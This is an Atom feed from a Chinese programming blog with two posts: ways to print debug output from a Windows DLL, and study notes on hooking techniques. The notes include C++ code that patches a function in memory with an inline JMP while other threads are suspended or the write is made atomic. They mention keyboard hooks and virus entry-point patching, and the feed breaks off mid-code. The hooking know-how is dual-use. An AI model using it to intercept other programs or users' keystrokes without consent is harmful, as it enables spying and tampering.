<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>LiuLian</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://liul14n.top/"/>
  <updated>2022-05-23T13:04:49.581Z</updated>
  <id>http://liul14n.top/</id>
  
  <author>
    <name>LiuLian</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DLL输出调试信息的几种方式</title>
    <link href="http://liul14n.top/2022/05/23/DLL%E8%BE%93%E5%87%BA%E8%B0%83%E8%AF%95%E4%BF%A1%E6%81%AF%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <id>http://liul14n.top/2022/05/23/DLL输出调试信息的几种方式/</id>
    <published>2022-05-23T12:45:51.000Z</published>
    <updated>2022-05-23T13:04:49.581Z</updated>
    
    <content type="html"><![CDATA[<img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/caefb410ab63c69f8cbae7b8e2d5b7f21626370015976.jpeg"><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近有一些调试DLL的需求</p><p>平常经常写的控制台程序、Java、Python之类的都有相应的Print函数来输出一些调试信息</p><p>但是DLL比较特殊，而我又习惯了这种通过Print来打印输出调试信息的方式(后期会逐渐过渡到Debug调试):cry:</p><p>故搜集了几种相对应的方法</p><h1 id="0x01-PrintPrintPrint"><a href="#0x01-PrintPrintPrint" class="headerlink" title="0x01 PrintPrintPrint~"></a>0x01 PrintPrintPrint~</h1><p>以下三种方案均支持不定参数格式化</p><h2 id="关键头文件"><a href="#关键头文件" class="headerlink" title="关键头文件"></a>关键头文件</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="解决报错"><a href="#解决报错" class="headerlink" title="解决报错"></a>解决报错</h2><p>对于以下的几种方案，如果编译环境是VS，均会产生报错，可以通过在头部<code>#pragma warning(disable:4996)</code>或者<code>#define _CRT_SECURE_NO_WARNINGS</code></p><h2 id="方案一-MessageBox"><a href="#方案一-MessageBox" class="headerlink" title="方案一 MessageBox"></a>方案一 MessageBox</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> CDECL <span class="title">MessageBoxPrintf</span><span class="params">(TCHAR * szCaption, TCHAR * szFormat, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuff[MAX_PATH];</span><br><span class="line">va_list args;</span><br><span class="line">va_start(args, szFormat);</span><br><span class="line">vsnprintf(szBuff, <span class="keyword">sizeof</span>(szBuff) / <span class="keyword">sizeof</span>(TCHAR), szFormat, args);</span><br><span class="line"><span class="comment">//vsprintf(szBuff,szFormat,args);</span></span><br><span class="line">va_end(args);</span><br><span class="line"><span class="keyword">return</span> MessageBox(<span class="literal">NULL</span>, szBuff, szCaption, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageBoxPrintf((TCHAR*)(<span class="string">"Title"</span>), (TCHAR*)(<span class="string">"啊哈哈哈哈哈%d %s"</span>), int_num, str);</span><br></pre></td></tr></table></figure><h2 id="方案二-文件读写"><a href="#方案二-文件读写" class="headerlink" title="方案二 文件读写"></a>方案二 文件读写</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowDbgInfo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* data, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> temp[<span class="number">2048</span>];</span><br><span class="line">FILE * logFile = fopen(<span class="string">"debug.log"</span>, <span class="string">"a+"</span>);</span><br><span class="line"><span class="keyword">if</span> (!logFile)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSTEMTIME st;</span><br><span class="line">GetLocalTime(&amp;st);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">"[*] DLL_log: %d-%d-%d %02d:%02d:%02d "</span>, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);</span><br><span class="line">OutputDebugStringA(temp);</span><br><span class="line"><span class="built_in">fprintf</span>(logFile, <span class="string">"%s"</span>, temp);</span><br><span class="line"></span><br><span class="line">va_list ap;</span><br><span class="line">va_start(ap, data);</span><br><span class="line"><span class="built_in">vsprintf</span>(temp, data, ap);</span><br><span class="line">OutputDebugStringA(temp);</span><br><span class="line">va_end(ap);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(logFile, <span class="string">"%s\n"</span>, temp);</span><br><span class="line">fflush(logFile);</span><br><span class="line">fclose(logFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ShowDbgInfo(<span class="string">" [+] %d %s"</span>, int_num,str);</span><br></pre></td></tr></table></figure><h2 id="方案三-控制台输出"><a href="#方案三-控制台输出" class="headerlink" title="方案三 控制台输出"></a>方案三 控制台输出</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dllPrintf</span><span class="params">(<span class="keyword">char</span>* fmt, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//不定参数格式化</span></span><br><span class="line">va_list argptr;</span><br><span class="line">va_start(argptr, fmt);</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">512</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> cnt = <span class="built_in">vsprintf</span>(buffer, fmt, argptr);</span><br><span class="line">va_end(argptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//建立控制台窗口</span></span><br><span class="line"><span class="keyword">static</span> HANDLE gHConsole = INVALID_HANDLE_VALUE;</span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == gHConsole) &#123;</span><br><span class="line">AllocConsole();</span><br><span class="line">gHConsole = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印到指定的控制台窗口</span></span><br><span class="line">DWORD dw;</span><br><span class="line">WriteConsole(gHConsole, buffer, <span class="built_in">strlen</span>(buffer), &amp;dw, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>(cnt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dllPrintf(<span class="string">" [+] %d %s"</span>, int_num,str);</span><br></pre></td></tr></table></figure><h1 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h1><p><a href="https://blog.csdn.net/weixin_28782251/article/details/117116569" target="_blank" rel="noopener">DLL_MessageBox</a></p><p><a href="https://blog.csdn.net/sinat_27720649/article/details/108386610" target="_blank" rel="noopener">DLL_文件读写</a></p><p><a href="https://www.shangmayuan.com/a/1896e4d6016a4b7b8bc4b0d0.html" target="_blank" rel="noopener">DLL_控制台输出</a></p><p>其中对于文件读写篇，本文修复了一个bug:<code>原文fopen采用了w+参数，而实际上应该采用a+来进行追加写入</code>，并完善了代码:<code>新增fclose来关闭句柄</code>。</p>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/caefb410ab63c69f8cbae7b8e2d5b7f21626370015976.jpeg&quot;&gt;
    
    </summary>
    
      <category term="随手小记" scheme="http://liul14n.top/categories/%E9%9A%8F%E6%89%8B%E5%B0%8F%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>HOOK技术学习笔记</title>
    <link href="http://liul14n.top/2022/04/12/HOOK%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://liul14n.top/2022/04/12/HOOK技术学习笔记/</id>
    <published>2022-04-11T16:52:14.000Z</published>
    <updated>2022-05-23T12:44:18.231Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/97547828_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>再来系统学习一下之前学的不扎实的HOOK技术:cry:</p><p>HOOK技术，用好了能有很奇妙的效果哟~</p><p>可以对程序的执行流进行监控、拦截。举个例子：键盘钩子，可以监控用户通过键盘输入了什么:happy:</p><p>本文重点去讨论<code>HOOK过程的原子性</code></p><h1 id="0x01-HOOK的几种分类"><a href="#0x01-HOOK的几种分类" class="headerlink" title="0x01 HOOK的几种分类"></a>0x01 HOOK的几种分类</h1><p>HOOK技术可以分为<code>Inline Hook</code>、<code>Address Hook</code>、<code>基于异常处理的Hook</code>、<code>不是HOOK的HOOK</code>等</p><h2 id="1-Inline-Hook"><a href="#1-Inline-Hook" class="headerlink" title="1. Inline Hook"></a>1. Inline Hook</h2><p>Inline Hook是指直接修改指令的Hook，其关键是转移程序的执行流程，一般用jmp、call、retn等转移指令</p><h3 id="几种常见形式"><a href="#几种常见形式" class="headerlink" title="几种常见形式"></a>几种常见形式</h3><ol><li>jmp xxxxxxxx(5字节)</li><li>push xxxxxxxx / retn(6字节)</li><li>mov eax,xxxxxxxx / jmp eax(7字节)</li><li>call Hook</li><li>HotPatch Hook</li></ol><h2 id="2-Address-Hook"><a href="#2-Address-Hook" class="headerlink" title="2. Address Hook"></a>2. Address Hook</h2><p>Address Hook是指通过修改数据来进行Hook，这些数据往往是一些函数的地址或者偏移量，它们通常存放在某类数据结构中或是指定位置处，也可能是存在于寄存器中。它们有一个共同点，就是会在某时刻成为执行过程中的eip，因此将这数据替换成我们想要的函数地址就实现了Hook</p><h3 id="几种常见形式-1"><a href="#几种常见形式-1" class="headerlink" title="几种常见形式"></a>几种常见形式</h3><ol><li>IAT(Import Address Table,输入表)</li><li>EAT(Export Address Table,输出表)</li><li>user32.dll的回调函数表</li><li>IDT(Interrupt Descriptor Table,系统的中断描述符表)</li><li>SSDT和Shadow SSDT</li><li>C++类的虚函数表</li><li>COM接口的功能函数表</li><li>特殊寄存器中的地址</li><li>特定的函数指针</li></ol><h2 id="3-基于异常处理的Hook"><a href="#3-基于异常处理的Hook" class="headerlink" title="3. 基于异常处理的Hook"></a>3. 基于异常处理的Hook</h2><p>在程序中自行安装SEH，向被HOOK的位置写入一条会引发异常的指令，只要程序执行到这里就会触发异常，从而跳转到事先安装的异常处理程序处。</p><h2 id="4-不是HOOK的HOOK"><a href="#4-不是HOOK的HOOK" class="headerlink" title="4. 不是HOOK的HOOK"></a>4. 不是HOOK的HOOK</h2><p>回顾病毒和操作系统的一些行为，都是在某些时候取得程序的控制权，并进行适当的处理。</p><h3 id="几种常见的形式"><a href="#几种常见的形式" class="headerlink" title="几种常见的形式"></a>几种常见的形式</h3><ol><li><p>PE被感染，修改EnterPoint</p><p>会在执行完病毒代码后跳回正常的程序入口，使其不易被察觉。</p></li><li><p>系统回调机制</p></li><li><p>分层服务和过滤驱动模型</p></li></ol><h1 id="0x02-几个细节"><a href="#0x02-几个细节" class="headerlink" title="0x02 几个细节"></a>0x02 几个细节</h1><h2 id="1-裸函数-naked"><a href="#1-裸函数-naked" class="headerlink" title="1. 裸函数 naked"></a>1. 裸函数 naked</h2><p>__declspec(naked) 告诉编译器，以下的汇编不需要编译器再优化什么指令。</p><h2 id="2-系统位数引起的细节问题"><a href="#2-系统位数引起的细节问题" class="headerlink" title="2. 系统位数引起的细节问题"></a>2. 系统位数引起的细节问题</h2><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>指针在x86上4字节，在x64上8字节。</p><p>可以使用<code>ULONG_PTR</code>来自适应于编译器，类似的还有<code>SIZE_T</code></p><h3 id="内存地址对齐"><a href="#内存地址对齐" class="headerlink" title="内存地址对齐"></a>内存地址对齐</h3><p>x64最好按照16字节来对齐，尽管x64对应8字节</p><h3 id="PE格式"><a href="#PE格式" class="headerlink" title="PE格式"></a>PE格式</h3><p>影响依照PE结构的HOOK</p><h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><p>x64仅有<code>__fastcall</code>调用方式</p><p>用寄存器来传参</p><p>第1~4个整型参数依次按照<code>RCX、RDX、R8、R9</code>来传参</p><p>第1~4个浮点参数依次按照<code>XMM0、XMM1、XMM2、XMM3</code>来传参</p><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><p>对于直接跳转指令<code>E9</code>，跳转范围以当前位置为界，前后各2GB，在X86平台完全够用，但是在X64平台就不够了。</p><p>所以在64位的情况下，jmp必须直接包含目标地址</p><p>可以用</p><p><code>mov rax,addr / jmp rax</code></p><p><code>push ret</code></p><p><code>jmp [addr]</code>其中此jmp为<code>FF25</code>且<code>Address = eip + 偏移量 + 6(指令长度)</code></p><h3 id="PatchGuard"><a href="#PatchGuard" class="headerlink" title="PatchGuard"></a>PatchGuard</h3><h2 id="3-一个经典的问题"><a href="#3-一个经典的问题" class="headerlink" title="3. 一个经典的问题"></a>3. 一个经典的问题</h2><p>我们该如何保证HOOK的原子性？</p><p>即，我们如何保证负责HOOK的线程在进行HOOK的时候，其他线程不会访问被HOOK但还没完成HOOK的代码段？</p><p>这里提出几种解决方案，这几种解决方案均是受启发于《Windows核心编程》这本经典著作。</p><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>我们可以在执行HOOK的时候，挂起(Suspend)其他一切无关的线程，在HOOK完毕后再恢复(Resume)其他线程。</p><p>不过，这个方案相比方案二，<strong>耗时会较多一些</strong>。</p><p>相关代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Solution1</span><span class="params">(BOOL isSuspend)</span> </span>&#123;</span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwPid = GetCurrentProcessId();</span><br><span class="line">DWORD dwTid = GetCurrentThreadId();</span><br><span class="line">THREADENTRY32 stThreadEntry32;</span><br><span class="line">stThreadEntry32.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line">HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwPid);</span><br><span class="line"><span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">BOOL anymore = Thread32First(hSnapshot, &amp;stThreadEntry32);</span><br><span class="line"><span class="keyword">while</span> (anymore) &#123;</span><br><span class="line"><span class="keyword">if</span> (stThreadEntry32.th32OwnerProcessID == dwPid &amp;&amp; stThreadEntry32.th32ThreadID != dwTid) &#123;</span><br><span class="line">hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, stThreadEntry32.th32ThreadID);</span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (isSuspend) &#123;</span><br><span class="line">SuspendThread(hThread);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">ResumeThread(hThread);</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">&#125;</span><br><span class="line">anymore = Thread32Next(hSnapshot, &amp;stThreadEntry32);</span><br><span class="line">&#125;</span><br><span class="line">CloseHandle(hSnapshot);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>我们可以借助Windows提供的具有原子性的API，例如</p><p><code>InterlockedExchange</code>系列与<code>InterlockedCompareExchange</code>系列</p><p>但是值得注意的是，这两个系列均仅支持修改1/2/4/8字节，并不支持修改其他字节，是的，我并没有找到直接修改HOOK所需的5或者7字节的API，但是这并不妨碍我们进行修改，例如我们的Inline Hook往往是需要修改5或者7字节，这都小于8字节，因此我们可以调用<code>InterlockedExchange64</code>来直接修改8字节！</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Solution2_Install</span><span class="params">(DWORD originalCodeAddr, DWORD originalSize, DWORD newCodeAddr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (originalCodeAddr == <span class="number">0</span> || originalSize &lt; <span class="number">5</span> || originalSize &gt; <span class="number">8</span> || newCodeAddr == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置内存写权限</span></span><br><span class="line">DWORD dwOldProtectFlag;</span><br><span class="line">BOOL bRet = VirtualProtect((LPVOID)originalCodeAddr, <span class="number">8</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtectFlag);</span><br><span class="line"><span class="keyword">if</span> (!bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 计算E9 JMP后面的4字节 = 要跳转的地址 - CALL的下一条指令的地址</span></span><br><span class="line">DWORD dwJmpCode = newCodeAddr - (originalCodeAddr + <span class="number">5</span>);</span><br><span class="line"><span class="comment">// 由于要使用InterlockedExchange64来修改8字节，故构造替换的8字节</span></span><br><span class="line">BYTE bReplace[<span class="number">8</span>] = &#123; <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;<span class="comment">//全部用NOP替换</span></span><br><span class="line">bReplace[<span class="number">0</span>] = <span class="number">0xE9</span>; <span class="comment">// JMP</span></span><br><span class="line"></span><br><span class="line">*(PDWORD)(&amp;(bReplace[<span class="number">1</span>])) = dwJmpCode;<span class="comment">//☆体会这种语句的好处</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里以及下面的memcpy无伤大雅，这块只是准备工作，即便不能够线程安全也无所谓</span></span><br><span class="line"><span class="built_in">memcpy</span>( (BYTE*)(bReplace + originalSize),</span><br><span class="line">(LPVOID)(originalCodeAddr + originalSize), <span class="number">8</span> - originalSize);<span class="comment">//把后面字节copy过来</span></span><br><span class="line"></span><br><span class="line">LONG64 llReplace;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;llReplace, bReplace, <span class="number">8</span>);<span class="comment">//全都copy给一个64位的变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 原子操作hook</span></span><br><span class="line">InterlockedExchange64((LONG64 <span class="keyword">volatile</span>*)originalCodeAddr, llReplace);</span><br><span class="line"><span class="comment">// 恢复内存属性</span></span><br><span class="line">VirtualProtect((LPVOID)originalCodeAddr, <span class="number">8</span>, dwOldProtectFlag, &amp;dwOldProtectFlag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Solution2_Uninstall</span><span class="params">(DWORD originalCodeAddr, DWORD originalSize, BYTE * oldCodeAddr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (originalCodeAddr == <span class="number">0</span> || originalSize &lt; <span class="number">5</span> || originalSize &gt; <span class="number">8</span> || oldCodeAddr == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置内存写权限</span></span><br><span class="line">DWORD dwOldProtectFlag;</span><br><span class="line">BOOL bRet = VirtualProtect((LPVOID)originalCodeAddr, <span class="number">8</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtectFlag);</span><br><span class="line"><span class="keyword">if</span> (!bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于要使用InterlockedExchange64来修改8字节，故构造替换的8字节</span></span><br><span class="line">BYTE bReplace[<span class="number">8</span>] = &#123; <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;<span class="comment">//全部用NOP替换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里以及下面的memcpy无伤大雅，这块只是准备工作，即便不能够线程安全也无所谓</span></span><br><span class="line"><span class="built_in">memcpy</span>((BYTE*)bReplace, (LPVOID)(oldCodeAddr), originalSize);<span class="comment">//还原原始的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>((BYTE*)(bReplace + originalSize),</span><br><span class="line">(LPVOID)(originalCodeAddr + originalSize), <span class="number">8</span> - originalSize);<span class="comment">//把后面字节copy过来</span></span><br><span class="line"></span><br><span class="line">LONG64 llReplace;</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;llReplace, bReplace, <span class="number">8</span>);<span class="comment">//全都copy给一个64位的变量</span></span><br><span class="line"><span class="comment">// 原子操作hook</span></span><br><span class="line">InterlockedExchange64((LONG64 <span class="keyword">volatile</span>*)originalCodeAddr, llReplace);</span><br><span class="line"><span class="comment">// 恢复内存属性</span></span><br><span class="line">VirtualProtect((LPVOID)originalCodeAddr, <span class="number">8</span>, dwOldProtectFlag, &amp;dwOldProtectFlag);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方案三"><a href="#方案三" class="headerlink" title="方案三"></a>方案三</h3><p>借助信号量机制。</p><p>首先，我们进行修改内存的时候极有可能使用<code>memcpy</code>这个函数，而这个函数并不是线程安全函数，引用自StackOverflow</p><blockquote><p>memcpy is typically coded for raw speed. It will not be thread safe. If you require this, you need to perform the memcpy call inside of a critical section or use some other semaphor mechanism.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; take_mutex(&amp;mutex);</span><br><span class="line">&gt; <span class="built_in">memcpy</span>(dst, src, count);</span><br><span class="line">&gt; yield_mutex(&amp;mutex);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h1 id="0x03-HOOK实例"><a href="#0x03-HOOK实例" class="headerlink" title="0x03 HOOK实例"></a>0x03 HOOK实例</h1><p>来写一个DLL来稍微练习一下HOOK</p><p>同时为了应用上述提到的实现原子性的方案，给出多种代码作为参考。</p><h2 id="各方案共同的代码"><a href="#各方案共同的代码" class="headerlink" title="各方案共同的代码"></a>各方案共同的代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InlineHook.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">HookMessageBox</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HWND    hWnd,</span></span></span><br><span class="line"><span class="function"><span class="params">LPCTSTR lpText,</span></span></span><br><span class="line"><span class="function"><span class="params">LPCTSTR lpCaption,</span></span></span><br><span class="line"><span class="function"><span class="params">UINT   uType</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//安装钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">InstallHook</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnInstallHook</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化函数</span></span><br><span class="line"><span class="function">BOOL <span class="title">InitHook</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//方案一,依据BOOL型参数来决定是挂起还是恢复</span></span><br><span class="line"><span class="function">BOOL <span class="title">Solution1</span><span class="params">(BOOL isSuspend)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Solution2_Install</span><span class="params">(DWORD originalCodeAddr, DWORD originalSize, DWORD newCodeAddr)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">Solution2_Uninstall</span><span class="params">(DWORD originalCodeAddr, 